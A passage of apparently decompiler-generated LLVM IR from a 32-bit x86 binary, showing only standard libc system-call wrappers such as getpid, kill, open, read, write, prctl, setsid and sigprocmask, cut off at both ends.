  %v1_804dd27 = icmp eq i32 %v0_804dd1c, 0
  %v1_804dd29 = icmp eq i1 %v1_804dd27, false
  %v4_804dd29 = select i1 %v1_804dd29, i32 %v0_804dd1c, i32 4096
  ret i32 %v4_804dd29
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd30 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd30, i32* %stack_var_-4, align 4
  %v1_804dd39 = call i32 @getpid(i32 %v0_804dd30)
  store i32 %v1_804dd39, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dd39, -4095
  br i1 %tmp, label %dec_label_pc_804dd50, label %dec_label_pc_804dd44

dec_label_pc_804dd44:                             ; preds = %entry
  %v0_804dd44 = load i32, i32* %stack_var_-4, align 4
  %v1_804dd44 = call i32 @__errno_location(i32 %v0_804dd44)
  %v0_804dd49 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd49 = sub i32 0, %v0_804dd49
  %v2_804dd4b = inttoptr i32 %v1_804dd44 to i32*
  store i32 %v1_804dd49, i32* %v2_804dd4b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd50

dec_label_pc_804dd50:                             ; preds = %entry, %dec_label_pc_804dd44
  %v0_804dd51 = phi i32 [ %v1_804dd39, %entry ], [ -1, %dec_label_pc_804dd44 ]
  %v2_804dd54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd54, i32* @ebx, align 4
  ret i32 %v0_804dd51

; uselistorder directives
  uselistorder i32 %v1_804dd39, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd50, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd58 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd58, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804dd6b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804dd6b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dd6b, -4095
  br i1 %tmp, label %dec_label_pc_804dd84, label %dec_label_pc_804dd78

dec_label_pc_804dd78:                             ; preds = %entry
  %v0_804dd78 = load i32, i32* %stack_var_-4, align 4
  %v1_804dd78 = call i32 @__errno_location(i32 %v0_804dd78)
  %v0_804dd7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd7d = sub i32 0, %v0_804dd7d
  %v2_804dd7f = inttoptr i32 %v1_804dd78 to i32*
  store i32 %v1_804dd7d, i32* %v2_804dd7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd84

dec_label_pc_804dd84:                             ; preds = %entry, %dec_label_pc_804dd78
  %v0_804dd85 = phi i32 [ %v1_804dd6b, %entry ], [ -1, %dec_label_pc_804dd78 ]
  %v2_804dd88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd88, i32* @ebx, align 4
  ret i32 %v0_804dd85

; uselistorder directives
  uselistorder i32 %v1_804dd6b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd84, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd8c = load i32, i32* @edi, align 4
  store i32 %v0_804dd8c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dda4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ddac = call i32 @ioctl(i32 %v0_804dda4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804dda4, i32* @ebx, align 4
  store i32 %v3_804ddac, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804ddac, -4095
  br i1 %tmp, label %dec_label_pc_804ddc4, label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %entry
  %v1_804ddb8 = call i32 @__errno_location(i32 %v0_804dda4)
  %v0_804ddbd = load i32, i32* %edi.global-to-local, align 4
  %v1_804ddbd = sub i32 0, %v0_804ddbd
  %v2_804ddbf = inttoptr i32 %v1_804ddb8 to i32*
  store i32 %v1_804ddbd, i32* %v2_804ddbf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ddc4

dec_label_pc_804ddc4:                             ; preds = %entry, %dec_label_pc_804ddb8
  %v0_804ddc7 = phi i32 [ %v3_804ddac, %entry ], [ -1, %dec_label_pc_804ddb8 ]
  %v2_804ddc9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ddc9, i32* @edi, align 4
  ret i32 %v0_804ddc7

; uselistorder directives
  uselistorder i32 %v3_804ddac, { 1, 0, 2 }
  uselistorder i32 %v0_804dda4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddc4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddcc = load i32, i32* @ebx, align 4
  store i32 %v0_804ddcc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804dddf = call i32 @kill(i32 %v0_804ddcc, i32 %tmp4)
  store i32 %v2_804dddf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dddf, -4095
  br i1 %tmp, label %dec_label_pc_804ddf8, label %dec_label_pc_804ddec

dec_label_pc_804ddec:                             ; preds = %entry
  %v0_804ddec = load i32, i32* %stack_var_-4, align 4
  %v1_804ddec = call i32 @__errno_location(i32 %v0_804ddec)
  %v0_804ddf1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ddf1 = sub i32 0, %v0_804ddf1
  %v2_804ddf3 = inttoptr i32 %v1_804ddec to i32*
  store i32 %v1_804ddf1, i32* %v2_804ddf3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ddf8

dec_label_pc_804ddf8:                             ; preds = %entry, %dec_label_pc_804ddec
  %v0_804ddf9 = phi i32 [ %v2_804dddf, %entry ], [ -1, %dec_label_pc_804ddec ]
  %v2_804ddf8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ddf8, i32* @edx, align 4
  %v2_804ddfc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ddfc, i32* @ebx, align 4
  ret i32 %v0_804ddf9

; uselistorder directives
  uselistorder i32 %v2_804dddf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ddf8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804de03 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804de07 = sdiv i32 %sext, 16777216
  store i32 %v4_804de07, i32* @ecx, align 4
  %v4_804de0b = ptrtoint i8* %arg1 to i32
  %v3_804de0f = and i32 %arg2, 64
  %v4_804de0f = icmp eq i32 %v3_804de0f, 0
  br i1 %v4_804de0f, label %dec_label_pc_804de20, label %dec_label_pc_804de14

dec_label_pc_804de14:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804de20

dec_label_pc_804de20:                             ; preds = %entry, %dec_label_pc_804de14
  %v0_804de20 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804de14 ]
  store i32 %v0_804de20, i32* @edx, align 4
  store i32 %v4_804de0b, i32* %ebx.global-to-local, align 4
  %v5_804de2b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804de07)
  store i32 %v5_804de2b, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_804de2b, -4095
  br i1 %tmp16, label %dec_label_pc_804de43, label %dec_label_pc_804de37

dec_label_pc_804de37:                             ; preds = %dec_label_pc_804de20
  %v1_804de37 = call i32 @__errno_location(i32 %v0_804de03)
  %v0_804de3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de3c = sub i32 0, %v0_804de3c
  %v2_804de3e = inttoptr i32 %v1_804de37 to i32*
  store i32 %v1_804de3c, i32* %v2_804de3e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de43

dec_label_pc_804de43:                             ; preds = %dec_label_pc_804de20, %dec_label_pc_804de37
  %v0_804de46 = phi i32 [ %v5_804de2b, %dec_label_pc_804de20 ], [ -1, %dec_label_pc_804de37 ]
  store i32 %v0_804de03, i32* @ebx, align 4
  ret i32 %v0_804de46

; uselistorder directives
  uselistorder i32 %v5_804de2b, { 1, 0, 2 }
  uselistorder i32 %v4_804de07, { 1, 0 }
  uselistorder i32 %v0_804de03, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804de43, { 1, 0 }
  uselistorder label %dec_label_pc_804de20, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804de5b = inttoptr i32 %arg1 to i8*
  %v4_804de5b = call i32 @__libc_open(i8* %v3_804de5b, i32 577)
  ret i32 %v4_804de5b
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de64 = load i32, i32* @edi, align 4
  store i32 %v0_804de64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804de6c = load i32, i32* @ebx, align 4
  %v1_804de74 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804de74 = call i32 @pipe([2 x i32] %v1_804de74)
  store i32 %v0_804de6c, i32* @ebx, align 4
  store i32 %v2_804de74, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804de74, -4095
  br i1 %tmp, label %dec_label_pc_804de8c, label %dec_label_pc_804de80

dec_label_pc_804de80:                             ; preds = %entry
  %v1_804de80 = call i32 @__errno_location(i32 %v0_804de6c)
  %v0_804de85 = load i32, i32* %edi.global-to-local, align 4
  %v1_804de85 = sub i32 0, %v0_804de85
  %v2_804de87 = inttoptr i32 %v1_804de80 to i32*
  store i32 %v1_804de85, i32* %v2_804de87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de8c

dec_label_pc_804de8c:                             ; preds = %entry, %dec_label_pc_804de80
  %v0_804de8d = phi i32 [ %v2_804de74, %entry ], [ -1, %dec_label_pc_804de80 ]
  %v2_804de90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de90, i32* @edi, align 4
  ret i32 %v0_804de8d

; uselistorder directives
  uselistorder i32 %v2_804de74, { 1, 0, 2 }
  uselistorder i32 %v0_804de6c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804de8c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804de94 = load i32, i32* @edi, align 4
  %v0_804de95 = load i32, i32* @esi, align 4
  store i32 %v0_804de95, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804dead = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804deb5 = call i32 @prctl(i32 %v0_804dead, i32 %v0_804de95, i32 %v0_804de94, i32 %tmp6, i32 %arg1)
  store i32 %v0_804dead, i32* @ebx, align 4
  store i32 %v5_804deb5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804deb5, -4095
  br i1 %tmp, label %dec_label_pc_804decd, label %dec_label_pc_804dec1

dec_label_pc_804dec1:                             ; preds = %entry
  %v1_804dec1 = call i32 @__errno_location(i32 %v0_804dead)
  %v0_804dec6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dec6 = sub i32 0, %v0_804dec6
  %v2_804dec8 = inttoptr i32 %v1_804dec1 to i32*
  store i32 %v1_804dec6, i32* %v2_804dec8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804decd

dec_label_pc_804decd:                             ; preds = %entry, %dec_label_pc_804dec1
  %v0_804dece = phi i32 [ %v5_804deb5, %entry ], [ -1, %dec_label_pc_804dec1 ]
  %v2_804ded0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ded0, i32* @esi, align 4
  store i32 %v0_804de94, i32* @edi, align 4
  ret i32 %v0_804dece

; uselistorder directives
  uselistorder i32 %v5_804deb5, { 1, 0, 2 }
  uselistorder i32 %v0_804dead, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804decd, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ded4 = load i32, i32* @edi, align 4
  store i32 %v0_804ded4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dee4 = load i32, i32* @ebx, align 4
  %v4_804deec = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804dee4, i32* @ebx, align 4
  store i32 %v4_804deec, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804deec, -4095
  br i1 %tmp, label %dec_label_pc_804df04, label %dec_label_pc_804def8

dec_label_pc_804def8:                             ; preds = %entry
  %v1_804def8 = call i32 @__errno_location(i32 %v0_804dee4)
  %v0_804defd = load i32, i32* %edi.global-to-local, align 4
  %v1_804defd = sub i32 0, %v0_804defd
  %v2_804deff = inttoptr i32 %v1_804def8 to i32*
  store i32 %v1_804defd, i32* %v2_804deff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804df04

dec_label_pc_804df04:                             ; preds = %entry, %dec_label_pc_804def8
  %v0_804df05 = phi i32 [ %v4_804deec, %entry ], [ -1, %dec_label_pc_804def8 ]
  %v2_804df08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df08, i32* @edi, align 4
  ret i32 %v0_804df05

; uselistorder directives
  uselistorder i32 %v4_804deec, { 1, 0, 2 }
  uselistorder i32 %v0_804dee4, { 1, 0 }
  uselistorder label %dec_label_pc_804df04, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804df0d = load i32, i32* @esi, align 4
  store i32 %v0_804df0d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804df25 = load i32, i32* @ebx, align 4
  %v1_804df2d = call i32 @int80_syscall(i32 142)
  store i32 %v0_804df25, i32* @ebx, align 4
  store i32 %v1_804df2d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804df2d, -4095
  br i1 %tmp, label %dec_label_pc_804df45, label %dec_label_pc_804df39

dec_label_pc_804df39:                             ; preds = %entry
  %v1_804df39 = call i32 @__errno_location(i32 %v0_804df25)
  %v0_804df3e = load i32, i32* %esi.global-to-local, align 4
  %v1_804df3e = sub i32 0, %v0_804df3e
  %v2_804df40 = inttoptr i32 %v1_804df39 to i32*
  store i32 %v1_804df3e, i32* %v2_804df40, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804df45

dec_label_pc_804df45:                             ; preds = %entry, %dec_label_pc_804df39
  %v0_804df46 = phi i32 [ %v1_804df2d, %entry ], [ -1, %dec_label_pc_804df39 ]
  %v2_804df45 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804df45, i32* @edx, align 4
  %v2_804df48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804df48, i32* @esi, align 4
  ret i32 %v0_804df46

; uselistorder directives
  uselistorder i32 %v1_804df2d, { 1, 0, 2 }
  uselistorder i32 %v0_804df25, { 1, 0 }
  uselistorder label %dec_label_pc_804df45, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df4c = load i32, i32* @ebx, align 4
  store i32 %v0_804df4c, i32* %stack_var_-4, align 4
  %v1_804df55 = call i32 @setsid(i32 %v0_804df4c)
  store i32 %v1_804df55, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804df55, -4095
  br i1 %tmp, label %dec_label_pc_804df6c, label %dec_label_pc_804df60

dec_label_pc_804df60:                             ; preds = %entry
  %v0_804df60 = load i32, i32* %stack_var_-4, align 4
  %v1_804df60 = call i32 @__errno_location(i32 %v0_804df60)
  %v0_804df65 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df65 = sub i32 0, %v0_804df65
  %v2_804df67 = inttoptr i32 %v1_804df60 to i32*
  store i32 %v1_804df65, i32* %v2_804df67, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804df6c

dec_label_pc_804df6c:                             ; preds = %entry, %dec_label_pc_804df60
  %v0_804df6d = phi i32 [ %v1_804df55, %entry ], [ -1, %dec_label_pc_804df60 ]
  %v2_804df70 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df70, i32* @ebx, align 4
  ret i32 %v0_804df6d

; uselistorder directives
  uselistorder i32 %v1_804df55, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df6c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804df75 = load i32, i32* @esi, align 4
  %v4_804df79 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804df79, i32* @ecx, align 4
  %v2_804df85 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804df85, label %dec_label_pc_804df9e, label %dec_label_pc_804df89

dec_label_pc_804df89:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804df9e, label %dec_label_pc_804df8e

dec_label_pc_804df8e:                             ; preds = %dec_label_pc_804df89
  %v1_804df8e = call i32 @__errno_location(i32 %v0_804df75)
  %v1_804df93 = inttoptr i32 %v1_804df8e to i32*
  store i32 22, i32* %v1_804df93, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_804dfc5

dec_label_pc_804df9e:                             ; preds = %dec_label_pc_804df89, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804dfa3 = load i32, i32* @ebx, align 4
  %v7_804dfab = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_804dfa3, i32* @ebx, align 4
  %v1_804dfae = add i32 %v7_804dfab, 4096
  %v2_804dfae = icmp ult i32 %v7_804dfab, -4096
  %v3_804dfae = xor i32 %v7_804dfab, -2147483648
  %v4_804dfae = xor i32 %v1_804dfae, %v7_804dfab
  %v5_804dfae = and i32 %v4_804dfae, %v3_804dfae
  %v6_804dfae = icmp slt i32 %v5_804dfae, 0
  store i1 %v6_804dfae, i1* @of, align 1
  %v7_804dfae = icmp eq i32 %v1_804dfae, 0
  store i32 %v7_804dfab, i32* %esi.global-to-local, align 4
  %v2_804dfb5 = or i1 %v2_804dfae, %v7_804dfae
  br i1 %v2_804dfb5, label %dec_label_pc_804dfc5, label %dec_label_pc_804dfb7

dec_label_pc_804dfb7:                             ; preds = %dec_label_pc_804df9e
  %v1_804dfb7 = call i32 @__errno_location(i32 %v0_804dfa3)
  %v0_804dfbc = load i32, i32* %esi.global-to-local, align 4
  %v1_804dfbc = sub i32 0, %v0_804dfbc
  %v2_804dfbe = inttoptr i32 %v1_804dfb7 to i32*
  store i32 %v1_804dfbc, i32* %v2_804dfbe, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dfc5:                             ; preds = %dec_label_pc_804dfb7, %dec_label_pc_804df9e, %dec_label_pc_804df8e
  %storemerge = phi i32 [ -1, %dec_label_pc_804df8e ], [ %v7_804dfab, %dec_label_pc_804df9e ], [ -1, %dec_label_pc_804dfb7 ]
  %v2_804dfc5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfc5, i32* @edx, align 4
  store i32 %v0_804df75, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804dfae, { 1, 0 }
  uselistorder i32 %v7_804dfab, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_804dfa3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dfcc = load i32, i32* @edi, align 4
  store i32 %v0_804dfcc, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804dfd4 = load i32, i32* @ebx, align 4
  %v2_804dfdc = call i32 @time(i32* %arg1)
  store i32 %v0_804dfd4, i32* @ebx, align 4
  store i32 %v2_804dfdc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dfdc, -4095
  br i1 %tmp, label %dec_label_pc_804dff4, label %dec_label_pc_804dfe8

dec_label_pc_804dfe8:                             ; preds = %entry
  %v1_804dfe8 = call i32 @__errno_location(i32 %v0_804dfd4)
  %v0_804dfed = load i32, i32* %edi.global-to-local, align 4
  %v1_804dfed = sub i32 0, %v0_804dfed
  %v2_804dfef = inttoptr i32 %v1_804dfe8 to i32*
  store i32 %v1_804dfed, i32* %v2_804dfef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dff4

dec_label_pc_804dff4:                             ; preds = %entry, %dec_label_pc_804dfe8
  %v0_804dff5 = phi i32 [ %v2_804dfdc, %entry ], [ -1, %dec_label_pc_804dfe8 ]
  %v2_804dff4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dff4, i32* @edx, align 4
  %v2_804dff8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dff8, i32* @edi, align 4
  ret i32 %v0_804dff5

; uselistorder directives
  uselistorder i32 %v2_804dfdc, { 1, 0, 2 }
  uselistorder i32 %v0_804dfd4, { 1, 0 }
  uselistorder label %dec_label_pc_804dff4, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804e00d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804e00d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e018 = load i32, i32* @edi, align 4
  store i32 %v0_804e018, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e028 = load i32, i32* @ebx, align 4
  %v4_804e030 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e028, i32* @ebx, align 4
  store i32 %v4_804e030, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e030, -4095
  br i1 %tmp, label %dec_label_pc_804e048, label %dec_label_pc_804e03c

dec_label_pc_804e03c:                             ; preds = %entry
  %v1_804e03c = call i32 @__errno_location(i32 %v0_804e028)
  %v0_804e041 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e041 = sub i32 0, %v0_804e041
  %v2_804e043 = inttoptr i32 %v1_804e03c to i32*
  store i32 %v1_804e041, i32* %v2_804e043, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e048

dec_label_pc_804e048:                             ; preds = %entry, %dec_label_pc_804e03c
  %v0_804e049 = phi i32 [ %v4_804e030, %entry ], [ -1, %dec_label_pc_804e03c ]
  %v2_804e048 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e048, i32* @edx, align 4
  %v2_804e04c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e04c, i32* @edi, align 4
  ret i32 %v0_804e049

; uselistorder directives
  uselistorder i32 %v4_804e030, { 1, 0, 2 }
  uselistorder i32 %v0_804e028, { 1, 0 }
  uselistorder label %dec_label_pc_804e048, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e054 = load i32, i32* inttoptr (i32 134578712 to i32*), align 8
  %v2_804e059 = mul i32 %arg1, 2
  %v3_804e059 = add i32 %v0_804e054, %v2_804e059
  %v4_804e059 = inttoptr i32 %v3_804e059 to i16*
  %v5_804e059 = load i16, i16* %v4_804e059, align 2
  %v6_804e059 = zext i16 %v5_804e059 to i32
  %v1_804e05d = and i32 %v6_804e059, 32
  ret i32 %v1_804e05d
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e068 = add i32 %arg1, 128
  %v6_804e073 = icmp ugt i32 %v1_804e068, 383
  br i1 %v6_804e073, label %dec_label_pc_804e07e, label %dec_label_pc_804e075

dec_label_pc_804e075:                             ; preds = %entry
  %v0_804e075 = load i32, i32* inttoptr (i32 134578720 to i32*), align 32
  %v2_804e07a = mul i32 %arg1, 2
  %v3_804e07a = add i32 %v0_804e075, %v2_804e07a
  %v4_804e07a = inttoptr i32 %v3_804e07a to i16*
  %v5_804e07a = load i16, i16* %v4_804e07a, align 2
  %v6_804e07a = sext i16 %v5_804e07a to i32
  store i32 %v6_804e07a, i32* @edx, align 4
  br label %dec_label_pc_804e07e

dec_label_pc_804e07e:                             ; preds = %entry, %dec_label_pc_804e075
  %v0_804e07e = phi i32 [ %arg1, %entry ], [ %v6_804e07a, %dec_label_pc_804e075 ]
  ret i32 %v0_804e07e

; uselistorder directives
  uselistorder label %dec_label_pc_804e07e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805e720.147 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e08c = load i32, i32* @ebp, align 4
  %v0_804e08d = load i32, i32* @edi, align 4
  %v0_804e08e = load i32, i32* @esi, align 4
  %v0_804e08f = load i32, i32* @ebx, align 4
  %v4_804e093 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e093, i32* @esi, align 4
  %v1_804e097 = add i32 %v4_804e093, 52
  %v2_804e097 = inttoptr i32 %v1_804e097 to i32*
  %v3_804e097 = load i32, i32* %v2_804e097, align 4
  store i32 %v3_804e097, i32* @ebp, align 4
  %v1_804e09a = icmp eq i32 %v3_804e097, 0
  %v1_804e09c = icmp eq i1 %v1_804e09a, false
  br i1 %v1_804e09c, label %dec_label_pc_804e0bd, label %dec_label_pc_804e09e

dec_label_pc_804e09e:                             ; preds = %entry
  %v1_804e09e = add i32 %v4_804e093, 56
  store i32 %v1_804e09e, i32* @ebx, align 4
  %v2_804e0a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e0a8, i32* @eax, align 4
  %v2_804e0ad = call i32 @__pthread_return_void(i32 %v2_804e0a8, i32 134552147)
  %v0_804e0b2 = load i32, i32* @ebx, align 4
  %v1_804e0b5 = call i32 @__pthread_return_0(i32 %v0_804e0b2)
  store i32 %v1_804e0b5, i32* @eax, align 4
  %v0_804e0bf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e0bd

dec_label_pc_804e0bd:                             ; preds = %entry, %dec_label_pc_804e09e
  %v0_804e0c7 = phi i32 [ %v4_804e093, %entry ], [ %v0_804e0bf.pre, %dec_label_pc_804e09e ]
  store i32 0, i32* @edi, align 4
  %v1_804e0bf = inttoptr i32 %v0_804e0c7 to i8*
  %v2_804e0bf = load i8, i8* %v1_804e0bf, align 1
  %v3_804e0bf = and i8 %v2_804e0bf, 64
  %v4_804e0bf = icmp eq i8 %v3_804e0bf, 0
